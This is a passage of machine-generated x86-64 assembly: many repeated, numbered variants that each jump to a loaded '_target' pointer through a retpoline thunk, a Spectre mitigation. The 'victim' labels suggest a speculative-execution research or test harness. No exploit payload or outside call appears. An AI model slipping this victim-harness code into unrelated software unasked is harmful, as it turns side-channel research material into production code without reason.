.Lgg_retpol_setup_000887:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000887:
	jmp	.Lvictim_win0_continue
## Variant 888
.Lvictim_win0_var888:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000888
	jmp	.Lgg_retpol_after_000888
.Lgg_retpol_thunk_000888:
	callq	.Lgg_retpol_setup_000888
.Lgg_retpol_cap_000888:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000888
.Lgg_retpol_setup_000888:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000888:
	jmp	.Lvictim_win0_continue
## Variant 889
.Lvictim_win0_var889:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000889
	jmp	.Lgg_retpol_after_000889
.Lgg_retpol_thunk_000889:
	callq	.Lgg_retpol_setup_000889
.Lgg_retpol_cap_000889:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000889
.Lgg_retpol_setup_000889:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000889:
	jmp	.Lvictim_win0_continue
## Variant 890
.Lvictim_win0_var890:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000890
	jmp	.Lgg_retpol_after_000890
.Lgg_retpol_thunk_000890:
	callq	.Lgg_retpol_setup_000890
.Lgg_retpol_cap_000890:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000890
.Lgg_retpol_setup_000890:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000890:
	jmp	.Lvictim_win0_continue
## Variant 891
.Lvictim_win0_var891:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000891
	jmp	.Lgg_retpol_after_000891
.Lgg_retpol_thunk_000891:
	callq	.Lgg_retpol_setup_000891
.Lgg_retpol_cap_000891:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000891
.Lgg_retpol_setup_000891:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000891:
	jmp	.Lvictim_win0_continue
## Variant 892
.Lvictim_win0_var892:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000892
	jmp	.Lgg_retpol_after_000892
.Lgg_retpol_thunk_000892:
	callq	.Lgg_retpol_setup_000892
.Lgg_retpol_cap_000892:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000892
.Lgg_retpol_setup_000892:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000892:
	jmp	.Lvictim_win0_continue
## Variant 893
.Lvictim_win0_var893:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000893
	jmp	.Lgg_retpol_after_000893
.Lgg_retpol_thunk_000893:
	callq	.Lgg_retpol_setup_000893
.Lgg_retpol_cap_000893:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000893
.Lgg_retpol_setup_000893:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000893:
	jmp	.Lvictim_win0_continue
## Variant 894
.Lvictim_win0_var894:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000894
	jmp	.Lgg_retpol_after_000894
.Lgg_retpol_thunk_000894:
	callq	.Lgg_retpol_setup_000894
.Lgg_retpol_cap_000894:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000894
.Lgg_retpol_setup_000894:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000894:
	jmp	.Lvictim_win0_continue
## Variant 895
.Lvictim_win0_var895:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000895
	jmp	.Lgg_retpol_after_000895
.Lgg_retpol_thunk_000895:
	callq	.Lgg_retpol_setup_000895
.Lgg_retpol_cap_000895:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000895
.Lgg_retpol_setup_000895:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000895:
	jmp	.Lvictim_win0_continue
## Variant 896
.Lvictim_win0_var896:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000896
	jmp	.Lgg_retpol_after_000896
.Lgg_retpol_thunk_000896:
	callq	.Lgg_retpol_setup_000896
.Lgg_retpol_cap_000896:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000896
.Lgg_retpol_setup_000896:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000896:
	jmp	.Lvictim_win0_continue
## Variant 897
.Lvictim_win0_var897:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000897
	jmp	.Lgg_retpol_after_000897
.Lgg_retpol_thunk_000897:
	callq	.Lgg_retpol_setup_000897
.Lgg_retpol_cap_000897:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000897
.Lgg_retpol_setup_000897:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000897:
	jmp	.Lvictim_win0_continue
## Variant 898
.Lvictim_win0_var898:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000898
	jmp	.Lgg_retpol_after_000898
.Lgg_retpol_thunk_000898:
	callq	.Lgg_retpol_setup_000898
.Lgg_retpol_cap_000898:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000898
.Lgg_retpol_setup_000898:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000898:
	jmp	.Lvictim_win0_continue
## Variant 899
.Lvictim_win0_var899:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000899
	jmp	.Lgg_retpol_after_000899
.Lgg_retpol_thunk_000899:
	callq	.Lgg_retpol_setup_000899
.Lgg_retpol_cap_000899:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000899
.Lgg_retpol_setup_000899:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000899:
	jmp	.Lvictim_win0_continue
## Variant 900
.Lvictim_win0_var900:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000900
	jmp	.Lgg_retpol_after_000900
.Lgg_retpol_thunk_000900:
	callq	.Lgg_retpol_setup_000900
.Lgg_retpol_cap_000900:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000900
.Lgg_retpol_setup_000900:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000900:
	jmp	.Lvictim_win0_continue
## Variant 901
.Lvictim_win0_var901:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000901
	jmp	.Lgg_retpol_after_000901
.Lgg_retpol_thunk_000901:
	callq	.Lgg_retpol_setup_000901
.Lgg_retpol_cap_000901:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000901
.Lgg_retpol_setup_000901:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000901:
	jmp	.Lvictim_win0_continue
## Variant 902
.Lvictim_win0_var902:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000902
	jmp	.Lgg_retpol_after_000902
.Lgg_retpol_thunk_000902:
	callq	.Lgg_retpol_setup_000902
.Lgg_retpol_cap_000902:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000902
.Lgg_retpol_setup_000902:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000902:
	jmp	.Lvictim_win0_continue
## Variant 903
.Lvictim_win0_var903:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000903
	jmp	.Lgg_retpol_after_000903
.Lgg_retpol_thunk_000903:
	callq	.Lgg_retpol_setup_000903
.Lgg_retpol_cap_000903:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000903
.Lgg_retpol_setup_000903:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000903:
	jmp	.Lvictim_win0_continue
## Variant 904
.Lvictim_win0_var904:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000904
	jmp	.Lgg_retpol_after_000904
.Lgg_retpol_thunk_000904:
	callq	.Lgg_retpol_setup_000904
.Lgg_retpol_cap_000904:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000904
.Lgg_retpol_setup_000904:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000904:
	jmp	.Lvictim_win0_continue
## Variant 905
.Lvictim_win0_var905:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000905
	jmp	.Lgg_retpol_after_000905
.Lgg_retpol_thunk_000905:
	callq	.Lgg_retpol_setup_000905
.Lgg_retpol_cap_000905:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000905
.Lgg_retpol_setup_000905:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000905:
	jmp	.Lvictim_win0_continue
## Variant 906
.Lvictim_win0_var906:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000906
	jmp	.Lgg_retpol_after_000906
.Lgg_retpol_thunk_000906:
	callq	.Lgg_retpol_setup_000906
.Lgg_retpol_cap_000906:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000906
.Lgg_retpol_setup_000906:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000906:
	jmp	.Lvictim_win0_continue
## Variant 907
.Lvictim_win0_var907:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000907
	jmp	.Lgg_retpol_after_000907
.Lgg_retpol_thunk_000907:
	callq	.Lgg_retpol_setup_000907
.Lgg_retpol_cap_000907:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000907
.Lgg_retpol_setup_000907:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000907:
	jmp	.Lvictim_win0_continue
## Variant 908
.Lvictim_win0_var908:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000908
	jmp	.Lgg_retpol_after_000908
.Lgg_retpol_thunk_000908:
	callq	.Lgg_retpol_setup_000908
.Lgg_retpol_cap_000908:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000908
.Lgg_retpol_setup_000908:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000908:
	jmp	.Lvictim_win0_continue
## Variant 909
.Lvictim_win0_var909:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000909
	jmp	.Lgg_retpol_after_000909
.Lgg_retpol_thunk_000909:
	callq	.Lgg_retpol_setup_000909
.Lgg_retpol_cap_000909:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000909
.Lgg_retpol_setup_000909:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000909:
	jmp	.Lvictim_win0_continue
## Variant 910
.Lvictim_win0_var910:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000910
	jmp	.Lgg_retpol_after_000910
.Lgg_retpol_thunk_000910:
	callq	.Lgg_retpol_setup_000910
.Lgg_retpol_cap_000910:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000910
.Lgg_retpol_setup_000910:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000910:
	jmp	.Lvictim_win0_continue
## Variant 911
.Lvictim_win0_var911:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000911
	jmp	.Lgg_retpol_after_000911
.Lgg_retpol_thunk_000911:
	callq	.Lgg_retpol_setup_000911
.Lgg_retpol_cap_000911:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000911
.Lgg_retpol_setup_000911:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000911:
	jmp	.Lvictim_win0_continue
## Variant 912
.Lvictim_win0_var912:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000912
	jmp	.Lgg_retpol_after_000912
.Lgg_retpol_thunk_000912:
	callq	.Lgg_retpol_setup_000912
.Lgg_retpol_cap_000912:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000912
.Lgg_retpol_setup_000912:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000912:
	jmp	.Lvictim_win0_continue
## Variant 913
.Lvictim_win0_var913:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000913
	jmp	.Lgg_retpol_after_000913
.Lgg_retpol_thunk_000913:
	callq	.Lgg_retpol_setup_000913
.Lgg_retpol_cap_000913:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000913
.Lgg_retpol_setup_000913:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000913:
	jmp	.Lvictim_win0_continue
## Variant 914
.Lvictim_win0_var914:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000914
	jmp	.Lgg_retpol_after_000914
.Lgg_retpol_thunk_000914:
	callq	.Lgg_retpol_setup_000914
.Lgg_retpol_cap_000914:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000914
.Lgg_retpol_setup_000914:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000914:
	jmp	.Lvictim_win0_continue
## Variant 915
.Lvictim_win0_var915:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000915
	jmp	.Lgg_retpol_after_000915
.Lgg_retpol_thunk_000915:
	callq	.Lgg_retpol_setup_000915
.Lgg_retpol_cap_000915:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000915
.Lgg_retpol_setup_000915:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000915:
	jmp	.Lvictim_win0_continue
## Variant 916
.Lvictim_win0_var916:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000916
	jmp	.Lgg_retpol_after_000916
.Lgg_retpol_thunk_000916:
	callq	.Lgg_retpol_setup_000916
.Lgg_retpol_cap_000916:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000916
.Lgg_retpol_setup_000916:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000916:
	jmp	.Lvictim_win0_continue
## Variant 917
.Lvictim_win0_var917:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000917
	jmp	.Lgg_retpol_after_000917
.Lgg_retpol_thunk_000917:
	callq	.Lgg_retpol_setup_000917
.Lgg_retpol_cap_000917:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000917
.Lgg_retpol_setup_000917:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000917:
	jmp	.Lvictim_win0_continue
## Variant 918
.Lvictim_win0_var918:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000918
	jmp	.Lgg_retpol_after_000918
.Lgg_retpol_thunk_000918:
	callq	.Lgg_retpol_setup_000918
.Lgg_retpol_cap_000918:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000918
.Lgg_retpol_setup_000918:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000918:
	jmp	.Lvictim_win0_continue
## Variant 919
.Lvictim_win0_var919:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000919
	jmp	.Lgg_retpol_after_000919
.Lgg_retpol_thunk_000919:
	callq	.Lgg_retpol_setup_000919
.Lgg_retpol_cap_000919:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000919
.Lgg_retpol_setup_000919:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000919:
	jmp	.Lvictim_win0_continue
## Variant 920
.Lvictim_win0_var920:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000920
	jmp	.Lgg_retpol_after_000920
.Lgg_retpol_thunk_000920:
	callq	.Lgg_retpol_setup_000920
.Lgg_retpol_cap_000920:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000920
.Lgg_retpol_setup_000920:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000920:
	jmp	.Lvictim_win0_continue
## Variant 921
.Lvictim_win0_var921:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000921
	jmp	.Lgg_retpol_after_000921
.Lgg_retpol_thunk_000921:
	callq	.Lgg_retpol_setup_000921
.Lgg_retpol_cap_000921:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000921
.Lgg_retpol_setup_000921:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000921:
	jmp	.Lvictim_win0_continue
## Variant 922
.Lvictim_win0_var922:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000922
	jmp	.Lgg_retpol_after_000922
.Lgg_retpol_thunk_000922:
	callq	.Lgg_retpol_setup_000922
.Lgg_retpol_cap_000922:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000922
.Lgg_retpol_setup_000922:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000922:
	jmp	.Lvictim_win0_continue
## Variant 923
.Lvictim_win0_var923:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000923
	jmp	.Lgg_retpol_after_000923
.Lgg_retpol_thunk_000923:
	callq	.Lgg_retpol_setup_000923
.Lgg_retpol_cap_000923:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000923
.Lgg_retpol_setup_000923:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000923:
	jmp	.Lvictim_win0_continue
## Variant 924
.Lvictim_win0_var924:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000924
	jmp	.Lgg_retpol_after_000924
.Lgg_retpol_thunk_000924:
	callq	.Lgg_retpol_setup_000924
.Lgg_retpol_cap_000924:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000924
.Lgg_retpol_setup_000924:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000924:
	jmp	.Lvictim_win0_continue
## Variant 925
.Lvictim_win0_var925:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000925
	jmp	.Lgg_retpol_after_000925
.Lgg_retpol_thunk_000925:
	callq	.Lgg_retpol_setup_000925
.Lgg_retpol_cap_000925:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000925
.Lgg_retpol_setup_000925:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000925:
	jmp	.Lvictim_win0_continue
## Variant 926
.Lvictim_win0_var926:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000926
	jmp	.Lgg_retpol_after_000926
.Lgg_retpol_thunk_000926:
	callq	.Lgg_retpol_setup_000926
.Lgg_retpol_cap_000926:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000926
.Lgg_retpol_setup_000926:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000926:
	jmp	.Lvictim_win0_continue
## Variant 927
.Lvictim_win0_var927:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000927
	jmp	.Lgg_retpol_after_000927
.Lgg_retpol_thunk_000927:
	callq	.Lgg_retpol_setup_000927
.Lgg_retpol_cap_000927:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000927
.Lgg_retpol_setup_000927:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000927:
	jmp	.Lvictim_win0_continue
## Variant 928
.Lvictim_win0_var928:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000928
	jmp	.Lgg_retpol_after_000928
.Lgg_retpol_thunk_000928:
	callq	.Lgg_retpol_setup_000928
.Lgg_retpol_cap_000928:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000928
.Lgg_retpol_setup_000928:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000928:
	jmp	.Lvictim_win0_continue
## Variant 929
.Lvictim_win0_var929:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000929
	jmp	.Lgg_retpol_after_000929
.Lgg_retpol_thunk_000929:
	callq	.Lgg_retpol_setup_000929
.Lgg_retpol_cap_000929:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000929
.Lgg_retpol_setup_000929:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000929:
	jmp	.Lvictim_win0_continue
## Variant 930
.Lvictim_win0_var930:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000930
	jmp	.Lgg_retpol_after_000930
.Lgg_retpol_thunk_000930:
	callq	.Lgg_retpol_setup_000930
.Lgg_retpol_cap_000930:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000930
.Lgg_retpol_setup_000930:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000930:
	jmp	.Lvictim_win0_continue
## Variant 931
.Lvictim_win0_var931:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000931
	jmp	.Lgg_retpol_after_000931
.Lgg_retpol_thunk_000931:
	callq	.Lgg_retpol_setup_000931
.Lgg_retpol_cap_000931:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000931
.Lgg_retpol_setup_000931:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000931:
	jmp	.Lvictim_win0_continue
## Variant 932
.Lvictim_win0_var932:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000932
	jmp	.Lgg_retpol_after_000932
.Lgg_retpol_thunk_000932:
	callq	.Lgg_retpol_setup_000932
.Lgg_retpol_cap_000932:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000932
.Lgg_retpol_setup_000932:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000932:
	jmp	.Lvictim_win0_continue
## Variant 933
.Lvictim_win0_var933:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000933
	jmp	.Lgg_retpol_after_000933
.Lgg_retpol_thunk_000933:
	callq	.Lgg_retpol_setup_000933
.Lgg_retpol_cap_000933:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000933
.Lgg_retpol_setup_000933:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000933:
	jmp	.Lvictim_win0_continue
## Variant 934
.Lvictim_win0_var934:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000934
	jmp	.Lgg_retpol_after_000934
.Lgg_retpol_thunk_000934:
	callq	.Lgg_retpol_setup_000934
.Lgg_retpol_cap_000934:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000934
.Lgg_retpol_setup_000934:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000934:
	jmp	.Lvictim_win0_continue
## Variant 935
.Lvictim_win0_var935:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000935
	jmp	.Lgg_retpol_after_000935
.Lgg_retpol_thunk_000935:
	callq	.Lgg_retpol_setup_000935
.Lgg_retpol_cap_000935:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000935
.Lgg_retpol_setup_000935:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000935:
	jmp	.Lvictim_win0_continue
## Variant 936
.Lvictim_win0_var936:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000936
	jmp	.Lgg_retpol_after_000936
.Lgg_retpol_thunk_000936:
	callq	.Lgg_retpol_setup_000936
.Lgg_retpol_cap_000936:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000936
.Lgg_retpol_setup_000936:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000936:
	jmp	.Lvictim_win0_continue
## Variant 937
.Lvictim_win0_var937:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000937
	jmp	.Lgg_retpol_after_000937
.Lgg_retpol_thunk_000937:
	callq	.Lgg_retpol_setup_000937
.Lgg_retpol_cap_000937:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000937
.Lgg_retpol_setup_000937:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000937:
	jmp	.Lvictim_win0_continue
## Variant 938
.Lvictim_win0_var938:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000938
	jmp	.Lgg_retpol_after_000938
.Lgg_retpol_thunk_000938:
	callq	.Lgg_retpol_setup_000938
.Lgg_retpol_cap_000938:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000938
.Lgg_retpol_setup_000938:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000938:
	jmp	.Lvictim_win0_continue
## Variant 939
.Lvictim_win0_var939:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000939
	jmp	.Lgg_retpol_after_000939
.Lgg_retpol_thunk_000939:
	callq	.Lgg_retpol_setup_000939
.Lgg_retpol_cap_000939:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000939
.Lgg_retpol_setup_000939:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000939:
	jmp	.Lvictim_win0_continue
